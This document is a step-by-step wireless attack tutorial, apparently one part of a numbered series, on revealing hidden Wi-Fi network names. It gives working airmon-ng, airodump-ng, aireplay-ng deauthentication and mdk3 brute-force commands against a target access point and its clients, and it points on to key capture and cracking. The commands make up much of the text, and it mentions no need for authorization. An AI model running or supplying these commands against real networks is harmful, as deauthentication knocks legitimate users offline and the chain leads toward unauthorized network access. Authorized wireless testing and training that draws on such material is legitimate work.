# Chain #8: Finding Hidden SSIDs

Hidden SSIDs are networks that do not broadcast their names. While this may stop casual users from noticing them, attackers and penetration testers can still reveal the SSID with the right techniques.

---

## Step 1: Enable Monitor Mode
Before attempting to discover hidden SSIDs, place your wireless interface into monitor mode so that it captures all frames.
```bash
sudo airmon-ng start wlan0
```
- This creates a monitor interface, usually named `wlan0mon`.
- If interfering processes exist (e.g., `NetworkManager` or `wpa_supplicant`), kill them with:
```bash
sudo airmon-ng check kill
```

---

## Step 2: Scan for Networks with Airodump-ng
Run airodump-ng on the monitor interface to detect visible and hidden SSIDs.
```bash
sudo airodump-ng -c 1 wlan0mon
```
- `-c 1` restricts scanning to channel 1.
- Hidden SSIDs will appear as `ESSID: <length: X>` where `X` is the number of characters.

---

## Step 3A: Detecting Hidden SSID via Deauthentication (WPA2)
If clients are connected to the hidden network, you can reveal the SSID by forcing a reconnect.

1. Start capturing again on the target channel:
```bash
sudo airodump-ng -c 1 wlan0mon
```
2. Send deauthentication packets to the client:
```bash
sudo aireplay-ng -0 10 -a <BSSID> -c <Client_MAC> wlan0mon
```
- `-0` = deauth attack.
- `10` = number of deauth frames to send.
- `-a` = target AP’s MAC address.
- `-c` = client’s MAC address.
- After the client reconnects, `airodump-ng` should display the SSID.

**Note:** This method does not work against WPA3 networks with Protected Management Frames (PMF).

---

## Step 3B: Brute-Forcing Hidden SSID (WPA3 or No Clients)
If no clients are connected, or the AP uses WPA3 with PMF, brute-force methods are required.

### Using mdk3 for Brute-Force:
```bash
sudo mdk3 wlan0mon p -b u -c 1 -t <BSSID>
```
- `p` = probe/ESSID brute-force mode.
- `-b u` = brute-force uppercase characters.
- `-c 1` = channel.
- `-t <BSSID>` = target AP.
- Other modes include:
  - `-b a` = all printable characters.
  - `-b m` = mixed case + numbers.

### Using a Wordlist:
```bash
sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t <BSSID>
```
- `-f` = use a wordlist.
- The tool probes with each word in the list until the AP responds, revealing the SSID.

---

## Step 4: Validate the Revealed SSID
Once the SSID is revealed (via deauth or brute-force), you can:
- Attempt authentication if you have or can capture the PSK.
- Proceed with cracking (see Chain #6).